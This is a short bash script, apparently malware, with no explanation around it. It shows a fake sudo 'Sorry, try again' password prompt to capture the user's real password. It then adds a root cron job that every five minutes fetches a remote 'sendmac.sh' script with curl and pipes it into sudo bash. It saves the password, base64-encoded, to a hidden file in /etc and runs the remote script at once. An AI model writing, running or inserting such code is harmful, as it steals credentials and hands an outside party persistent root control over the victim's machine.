#!/bin/bash

echo ""

psd=""
sudo -k

while [ "$(echo $psd | sudo -S whoami)" != "root" ]; do
  sleep 3
  echo "Sorry, try again."
  echo -n "Password:"
  read -s psd </dev/tty
  echo ""
  sudo -k
done

echo "out"

command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"

#write out current crontab
sudo crontab -u root -l > mycron
#echo new cron into cron file
echo "*/5 * * * * $command" >> mycron
#install new cron file
sudo crontab -u root mycron
rm mycron

enc=$(echo $psd | base64 | tr -- '+=/' '-_~')

sudo echo $enc > /etc/.psd.txt

curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
